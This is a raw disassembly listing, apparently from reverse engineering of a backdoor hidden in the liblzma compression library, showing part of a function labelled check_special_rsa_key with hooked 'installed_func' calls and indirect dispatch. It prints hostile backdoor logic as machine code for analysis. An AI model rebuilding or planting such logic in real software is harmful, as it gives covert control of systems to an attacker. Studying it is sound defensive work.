.text.lzma_index_stream_siza:0000000000009D2C                 cmp     byte ptr [rsp+5F8h+var_2E0+1], 0
.text.lzma_index_stream_siza:0000000000009D34                 js      short loc_9D66
.text.lzma_index_stream_siza:0000000000009D36                 mov     rdx, [rax+0C8h]
.text.lzma_index_stream_siza:0000000000009D3D                 test    rdx, rdx
.text.lzma_index_stream_siza:0000000000009D40                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009D46                 mov     ecx, [rdx]
.text.lzma_index_stream_siza:0000000000009D48                 cmp     ecx, 2
.text.lzma_index_stream_siza:0000000000009D4B                 jg      short loc_9D5D
.text.lzma_index_stream_siza:0000000000009D4D                 test    ecx, ecx
.text.lzma_index_stream_siza:0000000000009D4F                 js      loc_A1EA
.text.lzma_index_stream_siza:0000000000009D55                 mov     dword ptr [rdx], 3
.text.lzma_index_stream_siza:0000000000009D5B                 jmp     short loc_9D66
.text.lzma_index_stream_siza:0000000000009D5D ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009D5D
.text.lzma_index_stream_siza:0000000000009D5D loc_9D5D:                               ; CODE XREF: check_special_rsa_key+87B↑j
.text.lzma_index_stream_siza:0000000000009D5D                 cmp     ecx, 3
.text.lzma_index_stream_siza:0000000000009D60                 jnz     loc_A1EA
.text.lzma_index_stream_siza:0000000000009D66
.text.lzma_index_stream_siza:0000000000009D66 loc_9D66:                               ; CODE XREF: check_special_rsa_key+864↑j
.text.lzma_index_stream_siza:0000000000009D66                                         ; check_special_rsa_key+88B↑j
.text.lzma_index_stream_siza:0000000000009D66                 test    r15b, 40h
.text.lzma_index_stream_siza:0000000000009D6A                 jz      short loc_9D8B
.text.lzma_index_stream_siza:0000000000009D6C                 mov     rax, [rax+0C0h]
.text.lzma_index_stream_siza:0000000000009D73                 test    rax, rax
.text.lzma_index_stream_siza:0000000000009D76                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009D7C                 cmp     dword ptr [rax], 1
.text.lzma_index_stream_siza:0000000000009D7F                 ja      loc_A1EA
.text.lzma_index_stream_siza:0000000000009D85                 xor     r9d, r9d
.text.lzma_index_stream_siza:0000000000009D88                 mov     [rax], r9d
.text.lzma_index_stream_siza:0000000000009D8B
.text.lzma_index_stream_siza:0000000000009D8B loc_9D8B:                               ; CODE XREF: check_special_rsa_key+89A↑j
.text.lzma_index_stream_siza:0000000000009D8B                 and     r15b, 20h
.text.lzma_index_stream_siza:0000000000009D8F                 mov     dword ptr [rsp+5F8h+var_5A0], 0FFFFFFFFh
.text.lzma_index_stream_siza:0000000000009D97                 lea     rdi, [rsp+5F8h+var_5A0]
.text.lzma_index_stream_siza:0000000000009D9C                 jz      short loc_9DB7
.text.lzma_index_stream_siza:0000000000009D9E                 mov     sil, byte ptr [rsp+5F8h+var_2E0+1]
.text.lzma_index_stream_siza:0000000000009DA6                 mov     rdx, r12
.text.lzma_index_stream_siza:0000000000009DA9                 shr     sil, 3
.text.lzma_index_stream_siza:0000000000009DAD                 and     esi, 0Fh
.text.lzma_index_stream_siza:0000000000009DB0                 call    installed_func_2 ; PIC mode
.text.lzma_index_stream_siza:0000000000009DB5                 jmp     short loc_9DCC
.text.lzma_index_stream_siza:0000000000009DB7 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009DB7
.text.lzma_index_stream_siza:0000000000009DB7 loc_9DB7:                               ; CODE XREF: check_special_rsa_key+8CC↑j
.text.lzma_index_stream_siza:0000000000009DB7                 mov     rsi, rdi
.text.lzma_index_stream_siza:0000000000009DBA                 mov     ecx, 1
.text.lzma_index_stream_siza:0000000000009DBF                 mov     edx, 1
.text.lzma_index_stream_siza:0000000000009DC4                 mov     rdi, r13
.text.lzma_index_stream_siza:0000000000009DC7                 call    installed_func_3 ; PIC mode
.text.lzma_index_stream_siza:0000000000009DCC
.text.lzma_index_stream_siza:0000000000009DCC loc_9DCC:                               ; CODE XREF: check_special_rsa_key+8E5↑j
.text.lzma_index_stream_siza:0000000000009DCC                 test    eax, eax
.text.lzma_index_stream_siza:0000000000009DCE                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009DD4                 mov     ebp, dword ptr [rsp+5F8h+var_5A0]
.text.lzma_index_stream_siza:0000000000009DD8                 xor     r8d, r8d
.text.lzma_index_stream_siza:0000000000009DDB                 xorps   xmm0, xmm0
.text.lzma_index_stream_siza:0000000000009DDE                 mov     [rsp+5F8h+var_5A1], 0
.text.lzma_index_stream_siza:0000000000009DE3                 mov     dword ptr [rsp+5F8h+var_598], r8d
.text.lzma_index_stream_siza:0000000000009DE8                 movups  [rsp+5F8h+var_590], xmm0
.text.lzma_index_stream_siza:0000000000009DED                 test    ebp, ebp
.text.lzma_index_stream_siza:0000000000009DEF                 js      loc_A1EA
.text.lzma_index_stream_siza:0000000000009DF5                 mov     rbx, [r13+10h]
.text.lzma_index_stream_siza:0000000000009DF9                 test    rbx, rbx
.text.lzma_index_stream_siza:0000000000009DFC                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009E02                 cmp     qword ptr [rbx+40h], 0
.text.lzma_index_stream_siza:0000000000009E07                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009E0D                 cmp     qword ptr [rbx+50h], 0
.text.lzma_index_stream_siza:0000000000009E12                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009E18                 mov     r14d, ebp
.text.lzma_index_stream_siza:0000000000009E1B                 mov     r12d, 1
.text.lzma_index_stream_siza:0000000000009E21                 mov     ecx, ebp
.text.lzma_index_stream_siza:0000000000009E23                 sar     r14d, 6
.text.lzma_index_stream_siza:0000000000009E27                 shl     r12, cl
.text.lzma_index_stream_siza:0000000000009E2A                 movsxd  r14, r14d
.text.lzma_index_stream_siza:0000000000009E2D
.text.lzma_index_stream_siza:0000000000009E2D loc_9E2D:                               ; CODE XREF: check_special_rsa_key+9AA↓j
.text.lzma_index_stream_siza:0000000000009E2D                 lea     rsi, [rsp+5F8h+var_550]
.text.lzma_index_stream_siza:0000000000009E35                 xor     eax, eax
.text.lzma_index_stream_siza:0000000000009E37                 xor     r9d, r9d
.text.lzma_index_stream_siza:0000000000009E3A                 xor     edx, edx
.text.lzma_index_stream_siza:0000000000009E3C                 mov     ecx, 20h ; ' '
.text.lzma_index_stream_siza:0000000000009E41                 mov     rdi, rsi
.text.lzma_index_stream_siza:0000000000009E44                 lea     r8, [rsp+5F8h+var_590]
.text.lzma_index_stream_siza:0000000000009E49                 mov     qword ptr [rsp+5F8h+var_590+8], 1DCD6500h
.text.lzma_index_stream_siza:0000000000009E52                 rep stosd
.text.lzma_index_stream_siza:0000000000009E54                 xor     edi, edi
.text.lzma_index_stream_siza:0000000000009E56                 mov     qword ptr [rsp+r14*8+5F8h+var_550], r12
.text.lzma_index_stream_siza:0000000000009E5E                 mov     qword ptr [rsp+5F8h+var_590], rdi
.text.lzma_index_stream_siza:0000000000009E63                 lea     edi, [rbp+1]
.text.lzma_index_stream_siza:0000000000009E66                 call    qword ptr [rbx+40h]
.text.lzma_index_stream_siza:0000000000009E69                 test    eax, eax
.text.lzma_index_stream_siza:0000000000009E6B                 js      short loc_9E74
.text.lzma_index_stream_siza:0000000000009E6D                 jnz     short loc_9E81
.text.lzma_index_stream_siza:0000000000009E6F                 jmp     loc_A1EA
.text.lzma_index_stream_siza:0000000000009E74 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009E74
.text.lzma_index_stream_siza:0000000000009E74 loc_9E74:                               ; CODE XREF: check_special_rsa_key+99B↑j
.text.lzma_index_stream_siza:0000000000009E74                 call    qword ptr [rbx+50h]
.text.lzma_index_stream_siza:0000000000009E77                 cmp     dword ptr [rax], 4
.text.lzma_index_stream_siza:0000000000009E7A                 jz      short loc_9E2D
.text.lzma_index_stream_siza:0000000000009E7C                 jmp     loc_A1EA
.text.lzma_index_stream_siza:0000000000009E81 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009E81
.text.lzma_index_stream_siza:0000000000009E81 loc_9E81:                               ; CODE XREF: check_special_rsa_key+99D↑j
.text.lzma_index_stream_siza:0000000000009E81                 and     r12, qword ptr [rsp+r14*8+5F8h+var_550]
.text.lzma_index_stream_siza:0000000000009E89                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009E8F                 lea     rsi, [rsp+5F8h+var_598]
.text.lzma_index_stream_siza:0000000000009E94                 mov     rcx, rbx
.text.lzma_index_stream_siza:0000000000009E97                 mov     edx, 4
.text.lzma_index_stream_siza:0000000000009E9C                 mov     edi, ebp
.text.lzma_index_stream_siza:0000000000009E9E                 call    sub_70B0
.text.lzma_index_stream_siza:0000000000009EA3                 test    rax, rax
.text.lzma_index_stream_siza:0000000000009EA6                 js      loc_A1EA
.text.lzma_index_stream_siza:0000000000009EAC                 mov     eax, dword ptr [rsp+5F8h+var_598]
.text.lzma_index_stream_siza:0000000000009EB0                 bswap   eax
.text.lzma_index_stream_siza:0000000000009EB2                 mov     dword ptr [rsp+5F8h+var_598], eax
.text.lzma_index_stream_siza:0000000000009EB6                 dec     eax
.text.lzma_index_stream_siza:0000000000009EB8                 cmp     eax, 40h ; '@'
.text.lzma_index_stream_siza:0000000000009EBB                 ja      loc_A1EA
.text.lzma_index_stream_siza:0000000000009EC1                 lea     rsi, [rsp+5F8h+var_5A1]
.text.lzma_index_stream_siza:0000000000009EC6                 mov     rcx, rbx
.text.lzma_index_stream_siza:0000000000009EC9                 mov     edx, 1
.text.lzma_index_stream_siza:0000000000009ECE                 mov     edi, ebp
.text.lzma_index_stream_siza:0000000000009ED0                 call    sub_70B0
.text.lzma_index_stream_siza:0000000000009ED5                 test    rax, rax
.text.lzma_index_stream_siza:0000000000009ED8                 js      loc_A1EA
.text.lzma_index_stream_siza:0000000000009EDE                 mov     eax, dword ptr [rsp+5F8h+var_598]
.text.lzma_index_stream_siza:0000000000009EE2                 lea     rsi, [r13+0A0h]
.text.lzma_index_stream_siza:0000000000009EE9                 mov     rcx, rbx
.text.lzma_index_stream_siza:0000000000009EEC                 mov     edi, ebp
.text.lzma_index_stream_siza:0000000000009EEE                 lea     edx, [rax-1]
.text.lzma_index_stream_siza:0000000000009EF1                 mov     [r13+98h], rdx
.text.lzma_index_stream_siza:0000000000009EF8                 call    sub_70B0
.text.lzma_index_stream_siza:0000000000009EFD                 test    rax, rax
.text.lzma_index_stream_siza:0000000000009F00                 js      loc_A1EA
.text.lzma_index_stream_siza:0000000000009F06                 mov     rcx, [r13+20h]
.text.lzma_index_stream_siza:0000000000009F0A                 mov     rsi, [rcx+18h]
.text.lzma_index_stream_siza:0000000000009F0E                 test    rsi, rsi
.text.lzma_index_stream_siza:0000000000009F11                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009F17                 mov     al, byte ptr [rsp+5F8h+var_2E0+2]
.text.lzma_index_stream_siza:0000000000009F1E                 mov     rdx, [rcx+58h]
.text.lzma_index_stream_siza:0000000000009F22                 and     al, 3Fh
.text.lzma_index_stream_siza:0000000000009F24                 jz      short loc_9F2D
.text.lzma_index_stream_siza:0000000000009F26                 movzx   eax, al
.text.lzma_index_stream_siza:0000000000009F29                 add     eax, eax
.text.lzma_index_stream_siza:0000000000009F2B                 jmp     short loc_9F3A
.text.lzma_index_stream_siza:0000000000009F2D ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009F2D
.text.lzma_index_stream_siza:0000000000009F2D loc_9F2D:                               ; CODE XREF: check_special_rsa_key+A54↑j
.text.lzma_index_stream_siza:0000000000009F2D                 mov     eax, 16h
.text.lzma_index_stream_siza:0000000000009F32                 test    rdx, rdx
.text.lzma_index_stream_siza:0000000000009F35                 jz      short loc_9F3A
.text.lzma_index_stream_siza:0000000000009F37                 mov     eax, [rdx-8]
.text.lzma_index_stream_siza:0000000000009F3A
.text.lzma_index_stream_siza:0000000000009F3A loc_9F3A:                               ; CODE XREF: check_special_rsa_key+A5B↑j
.text.lzma_index_stream_siza:0000000000009F3A                                         ; check_special_rsa_key+A65↑j
.text.lzma_index_stream_siza:0000000000009F3A                 inc     eax
.text.lzma_index_stream_siza:0000000000009F3C                 mov     [rcx+60h], eax
.text.lzma_index_stream_siza:0000000000009F3F                 mov     [rdx], rsi
.text.lzma_index_stream_siza:0000000000009F42                 jmp     loc_A0A6
.text.lzma_index_stream_siza:0000000000009F47 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009F47
.text.lzma_index_stream_siza:0000000000009F47 loc_9F47:                               ; CODE XREF: check_special_rsa_key+835↑j
.text.lzma_index_stream_siza:0000000000009F47                 mov     al, byte ptr [rsp+5F8h+var_2E0+1]
.text.lzma_index_stream_siza:0000000000009F4E                 cmp     ebp, 1
.text.lzma_index_stream_siza:0000000000009F51                 jnz     short loc_9F8B
.text.lzma_index_stream_siza:0000000000009F53                 mov     sil, byte ptr [rsp+5F8h+var_2E0]
.text.lzma_index_stream_siza:0000000000009F5B                 mov     edx, eax
.text.lzma_index_stream_siza:0000000000009F5D                 mov     edi, eax
.text.lzma_index_stream_siza:0000000000009F5F                 mov     r8, r13
.text.lzma_index_stream_siza:0000000000009F62                 shr     dl, 1
.text.lzma_index_stream_siza:0000000000009F64                 movzx   ecx, byte ptr [rsp+5F8h+var_2E0+3]
.text.lzma_index_stream_siza:0000000000009F6C                 and     edi, 1
.text.lzma_index_stream_siza:0000000000009F6F                 shr     sil, 6
.text.lzma_index_stream_siza:0000000000009F73                 and     edx, 1
.text.lzma_index_stream_siza:0000000000009F76                 and     esi, 1
.text.lzma_index_stream_siza:0000000000009F79                 call    _Llzma_block_unpadded_size_1 ; PIC mode
.text.lzma_index_stream_siza:0000000000009F7E                 test    eax, eax
.text.lzma_index_stream_siza:0000000000009F80                 jz      loc_A1EA
.text.lzma_index_stream_siza:0000000000009F86                 jmp     loc_A0A6
.text.lzma_index_stream_siza:0000000000009F8B ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009F8B
.text.lzma_index_stream_siza:0000000000009F8B loc_9F8B:                               ; CODE XREF: check_special_rsa_key+A81↑j
.text.lzma_index_stream_siza:0000000000009F8B                 cmp     ebp, 2
.text.lzma_index_stream_siza:0000000000009F8E                 jnz     loc_A04A
.text.lzma_index_stream_siza:0000000000009F94                 movzx   ebx, bx
.text.lzma_index_stream_siza:0000000000009F97                 test    al, 1
.text.lzma_index_stream_siza:0000000000009F99                 jz      short loc_9FB7
.text.lzma_index_stream_siza:0000000000009F9B                 cmp     rbx, 8
.text.lzma_index_stream_siza:0000000000009F9F                 jbe     loc_A1EA
.text.lzma_index_stream_siza:0000000000009FA5                 mov     r14d, [r8]
.text.lzma_index_stream_siza:0000000000009FA8                 mov     edi, [r8+4]
.text.lzma_index_stream_siza:0000000000009FAC                 sub     rbx, 8
.text.lzma_index_stream_siza:0000000000009FB0                 mov     ebp, 8
.text.lzma_index_stream_siza:0000000000009FB5                 jmp     short loc_9FBB
.text.lzma_index_stream_siza:0000000000009FB7 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009FB7
.text.lzma_index_stream_siza:0000000000009FB7 loc_9FB7:                               ; CODE XREF: check_special_rsa_key+AC9↑j
.text.lzma_index_stream_siza:0000000000009FB7                 xor     edi, edi
.text.lzma_index_stream_siza:0000000000009FB9                 xor     ebp, ebp
.text.lzma_index_stream_siza:0000000000009FBB
.text.lzma_index_stream_siza:0000000000009FBB loc_9FBB:                               ; CODE XREF: check_special_rsa_key+AE5↑j
.text.lzma_index_stream_siza:0000000000009FBB                 test    r15b, r15b
.text.lzma_index_stream_siza:0000000000009FBE                 jns     short loc_9FE1
.text.lzma_index_stream_siza:0000000000009FC0                 cmp     rbx, 2
.text.lzma_index_stream_siza:0000000000009FC4                 jbe     loc_A1EA
.text.lzma_index_stream_siza:0000000000009FCA                 movzx   eax, word ptr [r8+rbp]
.text.lzma_index_stream_siza:0000000000009FCF                 sub     rbx, 2
.text.lzma_index_stream_siza:0000000000009FD3                 add     rbp, 2
.text.lzma_index_stream_siza:0000000000009FD7                 cmp     rax, rbx
.text.lzma_index_stream_siza:0000000000009FDA                 jnb     short loc_9FE9
.text.lzma_index_stream_siza:0000000000009FDC                 jmp     loc_A1EA
.text.lzma_index_stream_siza:0000000000009FE1 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009FE1
.text.lzma_index_stream_siza:0000000000009FE1 loc_9FE1:                               ; CODE XREF: check_special_rsa_key+AEE↑j
.text.lzma_index_stream_siza:0000000000009FE1                 movzx   eax, word ptr [rsp+5F8h+var_2E0+3]
.text.lzma_index_stream_siza:0000000000009FE9
.text.lzma_index_stream_siza:0000000000009FE9 loc_9FE9:                               ; CODE XREF: check_special_rsa_key+B0A↑j
.text.lzma_index_stream_siza:0000000000009FE9                 cmp     rbx, rax
.text.lzma_index_stream_siza:0000000000009FEC                 jb      loc_A1EA
.text.lzma_index_stream_siza:0000000000009FF2                 test    edi, edi
.text.lzma_index_stream_siza:0000000000009FF4                 jnz     short loc_9FFD
.text.lzma_index_stream_siza:0000000000009FF6
.text.lzma_index_stream_siza:0000000000009FF6 loc_9FF6:                               ; CODE XREF: check_special_rsa_key+B3D↓j
.text.lzma_index_stream_siza:0000000000009FF6                 test    r14d, r14d
.text.lzma_index_stream_siza:0000000000009FF9                 jnz     short loc_A014
.text.lzma_index_stream_siza:0000000000009FFB                 jmp     short loc_A034
.text.lzma_index_stream_siza:0000000000009FFD ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009FFD
.text.lzma_index_stream_siza:0000000000009FFD loc_9FFD:                               ; CODE XREF: check_special_rsa_key+B24↑j
.text.lzma_index_stream_siza:0000000000009FFD                 mov     [rsp+5F8h+var_5F8], r8
.text.lzma_index_stream_siza:000000000000A001                 mov     edx, edi
.text.lzma_index_stream_siza:000000000000A003                 mov     esi, edi
.text.lzma_index_stream_siza:000000000000A005                 call    rcx
.text.lzma_index_stream_siza:000000000000A007                 mov     r8, [rsp+5F8h+var_5F8]
.text.lzma_index_stream_siza:000000000000A00B                 inc     eax
.text.lzma_index_stream_siza:000000000000A00D                 jnz     short loc_9FF6
.text.lzma_index_stream_siza:000000000000A00F                 jmp     loc_A1EA
.text.lzma_index_stream_siza:000000000000A014 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:000000000000A014
.text.lzma_index_stream_siza:000000000000A014 loc_A014:                               ; CODE XREF: check_special_rsa_key+B29↑j
.text.lzma_index_stream_siza:000000000000A014                 mov     rax, [r13+10h]
.text.lzma_index_stream_siza:000000000000A018                 mov     [rsp+5F8h+var_5F8], r8
.text.lzma_index_stream_siza:000000000000A01C                 mov     edx, r14d
.text.lzma_index_stream_siza:000000000000A01F                 mov     esi, r14d
.text.lzma_index_stream_siza:000000000000A022                 mov     edi, r14d
.text.lzma_index_stream_siza:000000000000A025                 call    qword ptr [rax+28h]
.text.lzma_index_stream_siza:000000000000A028                 mov     r8, [rsp+5F8h+var_5F8]
.text.lzma_index_stream_siza:000000000000A02C                 inc     eax
.text.lzma_index_stream_siza:000000000000A02E                 jz      loc_A1EA
.text.lzma_index_stream_siza:000000000000A034
.text.lzma_index_stream_siza:000000000000A034 loc_A034:                               ; CODE XREF: check_special_rsa_key+B2B↑j
.text.lzma_index_stream_siza:000000000000A034                 lea     rdi, [r8+rbp]
.text.lzma_index_stream_siza:000000000000A038                 cmp     byte ptr [rdi], 0
.text.lzma_index_stream_siza:000000000000A03B                 jz      loc_A1EA
.text.lzma_index_stream_siza:000000000000A041                 mov     rax, [r13+10h]
.text.lzma_index_stream_siza:000000000000A045                 call    qword ptr [rax+30h]
.text.lzma_index_stream_siza:000000000000A048                 jmp     short loc_A0A6
.text.lzma_index_stream_siza:000000000000A04A ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:000000000000A04A
.text.lzma_index_stream_siza:000000000000A04A loc_A04A:                               ; CODE XREF: check_special_rsa_key+ABE↑j
.text.lzma_index_stream_siza:000000000000A04A                 and     eax, 0FFFFFFC0h
.text.lzma_index_stream_siza:000000000000A04D                 cmp     al, 0C0h
.text.lzma_index_stream_siza:000000000000A04F                 jnz     loc_A1EA
.text.lzma_index_stream_siza:000000000000A055                 cmp     qword ptr [r12+18h], 0
.text.lzma_index_stream_siza:000000000000A05B                 jz      loc_A1EA
.text.lzma_index_stream_siza:000000000000A061                 mov     rax, [r12+40h]
.text.lzma_index_stream_siza:000000000000A066                 test    rax, rax
.text.lzma_index_stream_siza:000000000000A069                 jz      loc_A1EA
.text.lzma_index_stream_siza:000000000000A06F                 xor     ecx, ecx
.text.lzma_index_stream_siza:000000000000A071                 xor     edi, edi
.text.lzma_index_stream_siza:000000000000A073                 xor     r9d, r9d
.text.lzma_index_stream_siza:000000000000A076                 xor     edx, edx
.text.lzma_index_stream_siza:000000000000A078                 mov     qword ptr [rsp+5F8h+var_550+8], rcx
.text.lzma_index_stream_siza:000000000000A080                 lea     r8, [rsp+5F8h+var_550]
.text.lzma_index_stream_siza:000000000000A088                 xor     ecx, ecx
.text.lzma_index_stream_siza:000000000000A08A                 xor     esi, esi
.text.lzma_index_stream_siza:000000000000A08C                 mov     qword ptr [rsp+5F8h+var_550], 5
.text.lzma_index_stream_siza:000000000000A098                 call    rax
.text.lzma_index_stream_siza:000000000000A09A                 xor     edi, edi
.text.lzma_index_stream_siza:000000000000A09C                 call    qword ptr [r12+18h]
.text.lzma_index_stream_siza:000000000000A0A1                 jmp     loc_A1EA
.text.lzma_index_stream_siza:000000000000A0A6 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:000000000000A0A6
.text.lzma_index_stream_siza:000000000000A0A6 loc_A0A6:                               ; CODE XREF: check_special_rsa_key+A72↑j
.text.lzma_index_stream_siza:000000000000A0A6                                         ; check_special_rsa_key+AB6↑j ...
.text.lzma_index_stream_siza:000000000000A0A6                 xorps   xmm0, xmm0
.text.lzma_index_stream_siza:000000000000A0A9                 xor     eax, eax
.text.lzma_index_stream_siza:000000000000A0AB                 lea     rdi, [rsp+5F8h+var_540]
.text.lzma_index_stream_siza:000000000000A0B3                 xor     edx, edx
.text.lzma_index_stream_siza:000000000000A0B5                 mov     ecx, 3Ch ; '<'
.text.lzma_index_stream_siza:000000000000A0BA                 mov     byte ptr [rsp+5F8h+var_590], 1
.text.lzma_index_stream_siza:000000000000A0BF                 mov     esi, 1
.text.lzma_index_stream_siza:000000000000A0C4                 movups  [rsp+5F8h+var_550], xmm0
.text.lzma_index_stream_siza:000000000000A0CC                 rep stosd
.text.lzma_index_stream_siza:000000000000A0CE                 mov     rax, [r13+8]
.text.lzma_index_stream_siza:000000000000A0D2                 lea     rdi, [rsp+5F8h+var_590]
.text.lzma_index_stream_siza:000000000000A0D7                 mov     byte ptr [rsp+5F8h+var_550], 80h
.text.lzma_index_stream_siza:000000000000A0DF                 mov     [rsp+5F8h+var_45A], 8
.text.lzma_index_stream_siza:000000000000A0E7                 mov     [rsp+5F8h+var_451], 1
.text.lzma_index_stream_siza:000000000000A0EF                 call    qword ptr [rax+0E0h]
.text.lzma_index_stream_siza:000000000000A0F5                 mov     rbx, rax
.text.lzma_index_stream_siza:000000000000A0F8                 test    rax, rax
.text.lzma_index_stream_siza:000000000000A0FB                 jz      loc_A1EA
.text.lzma_index_stream_siza:000000000000A101                 mov     rax, [r13+8]
.text.lzma_index_stream_siza:000000000000A105                 mov     esi, 100h
.text.lzma_index_stream_siza:000000000000A10A                 lea     rdi, [rsp+5F8h+var_550]
.text.lzma_index_stream_siza:000000000000A112                 xor     edx, edx
.text.lzma_index_stream_siza:000000000000A114                 call    qword ptr [rax+0E0h]
.text.lzma_index_stream_siza:000000000000A11A                 mov     rsi, rax
.text.lzma_index_stream_siza:000000000000A11D                 test    rax, rax
.text.lzma_index_stream_siza:000000000000A120                 jz      loc_A1EA
.text.lzma_index_stream_siza:000000000000A126                 mov     rax, [r13+8]
.text.lzma_index_stream_siza:000000000000A12A                 xor     ecx, ecx
.text.lzma_index_stream_siza:000000000000A12C                 mov     rdi, [rsp+5F8h+var_5D8]
.text.lzma_index_stream_siza:000000000000A131                 mov     rdx, rbx
.text.lzma_index_stream_siza:000000000000A134                 call    qword ptr [rax+0E8h]
.text.lzma_index_stream_siza:000000000000A13A                 dec     eax
.text.lzma_index_stream_siza:000000000000A13C                 jnz     loc_A1EA
.text.lzma_index_stream_siza:000000000000A142
.text.lzma_index_stream_siza:000000000000A142 loc_A142:                               ; CODE XREF: check_special_rsa_key+BB↑j
.text.lzma_index_stream_siza:000000000000A142                                         ; check_special_rsa_key+CA↑j ...
.text.lzma_index_stream_siza:000000000000A142                 mov     dword ptr [r13+18h], 1
.text.lzma_index_stream_siza:000000000000A14A
.text.lzma_index_stream_siza:000000000000A14A loc_A14A:                               ; CODE XREF: check_special_rsa_key+143↑j
.text.lzma_index_stream_siza:000000000000A14A                                         ; check_special_rsa_key+152↑j ...
.text.lzma_index_stream_siza:000000000000A14A                 mov     rax, [rsp+5F8h+var_5F0]
.text.lzma_index_stream_siza:000000000000A14F                 mov     dword ptr [rax], 1
.text.lzma_index_stream_siza:000000000000A155
.text.lzma_index_stream_siza:000000000000A155 loc_A155:                               ; CODE XREF: check_special_rsa_key+86↑j
.text.lzma_index_stream_siza:000000000000A155                                         ; check_special_rsa_key+D4B↓j ...
.text.lzma_index_stream_siza:000000000000A155                 xor     eax, eax
.text.lzma_index_stream_siza:000000000000A157                 jmp     loc_A25B
.text.lzma_index_stream_siza:000000000000A15C ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:000000000000A15C
.text.lzma_index_stream_siza:000000000000A15C loc_A15C:                               ; CODE XREF: check_special_rsa_key+7F9↑j
.text.lzma_index_stream_siza:000000000000A15C                 mov     rdi, [rsp+5F8h+var_5D0]
.text.lzma_index_stream_siza:000000000000A161                 xor     eax, eax
.text.lzma_index_stream_siza:000000000000A163                 mov     ecx, 0Bh
.text.lzma_index_stream_siza:000000000000A168                 mov     rsi, r13
.text.lzma_index_stream_siza:000000000000A16B                 rep stosd
.text.lzma_index_stream_siza:000000000000A16D                 lea     rax, [rsp+5F8h+var_2E0]
.text.lzma_index_stream_siza:000000000000A175                 lea     rdi, [rsp+5F8h+var_550]
.text.lzma_index_stream_siza:000000000000A17D                 mov     dword ptr [rsp+5F8h+var_550], ebp
.text.lzma_index_stream_siza:000000000000A184                 mov     qword ptr [rsp+5F8h+var_550+8], rax
.text.lzma_index_stream_siza:000000000000A18C                 mov     rax, [rsp+5F8h+var_2F0]
.text.lzma_index_stream_siza:000000000000A194                 mov     [rsp+5F8h+var_530], r8
.text.lzma_index_stream_siza:000000000000A19C                 mov     [rsp+5F8h+var_540], rax
.text.lzma_index_stream_siza:000000000000A1A4                 mov     rax, [rsp+5F8h+var_2E8]
.text.lzma_index_stream_siza:000000000000A1AC                 mov     [rsp+5F8h+var_528], bx
.text.lzma_index_stream_siza:000000000000A1B4                 mov     [rsp+5F8h+var_538], rax
.text.lzma_index_stream_siza:000000000000A1BC                 mov     rax, [rsp+5F8h+var_5D8]
.text.lzma_index_stream_siza:000000000000A1C1                 mov     [rsp+5F8h+var_520], rax
.text.lzma_index_stream_siza:000000000000A1C9                 call    installed_func_0 ; PIC mode
.text.lzma_index_stream_siza:000000000000A1CE                 test    eax, eax
.text.lzma_index_stream_siza:000000000000A1D0                 jz      short loc_A1EA
.text.lzma_index_stream_siza:000000000000A1D2                 mov     rax, [rsp+5F8h+var_5F0]
.text.lzma_index_stream_siza:000000000000A1D7                 xor     edx, edx
.text.lzma_index_stream_siza:000000000000A1D9                 mov     dword ptr [r13+18h], 1
.text.lzma_index_stream_siza:000000000000A1E1                 mov     [rax], edx
.text.lzma_index_stream_siza:000000000000A1E3                 mov     eax, 1
.text.lzma_index_stream_siza:000000000000A1E8                 jmp     short loc_A25B
.text.lzma_index_stream_siza:000000000000A1EA ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:000000000000A1EA
.text.lzma_index_stream_siza:000000000000A1EA loc_A1EA:                               ; CODE XREF: check_special_rsa_key+5FC↑j
.text.lzma_index_stream_siza:000000000000A1EA                                         ; check_special_rsa_key+60D↑j ...
.text.lzma_index_stream_siza:000000000000A1EA                 lea     rdx, [rsp+5F8h+var_73]
.text.lzma_index_stream_siza:000000000000A1F2                 mov     ecx, 39h ; '9'
.text.lzma_index_stream_siza:000000000000A1F7                 xor     eax, eax
.text.lzma_index_stream_siza:000000000000A1F9                 mov     dword ptr [r13+18h], 1
.text.lzma_index_stream_siza:000000000000A201                 mov     rdi, rdx
.text.lzma_index_stream_siza:000000000000A204                 rep stosb
.text.lzma_index_stream_siza:000000000000A206                 test    byte ptr [rsp+5F8h+var_2E0], 1
.text.lzma_index_stream_siza:000000000000A20E                 jz      loc_A14A
.text.lzma_index_stream_siza:000000000000A214                 mov     rax, [r13+10h]
.text.lzma_index_stream_siza:000000000000A218                 test    rax, rax
.text.lzma_index_stream_siza:000000000000A21B                 jz      loc_A155
.text.lzma_index_stream_siza:000000000000A221                 mov     rax, [rax+18h]
.text.lzma_index_stream_siza:000000000000A225                 test    rax, rax
.text.lzma_index_stream_siza:000000000000A228                 jz      loc_A155
.text.lzma_index_stream_siza:000000000000A22E                 xor     edi, edi
.text.lzma_index_stream_siza:000000000000A230                 call    rax
.text.lzma_index_stream_siza:000000000000A232                 jmp     loc_A155
.text.lzma_index_stream_siza:000000000000A237 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:000000000000A237
.text.lzma_index_stream_siza:000000000000A237 loc_A237:                               ; CODE XREF: check_special_rsa_key+40↑j
.text.lzma_index_stream_siza:000000000000A237                                         ; check_special_rsa_key+4C↑j ...
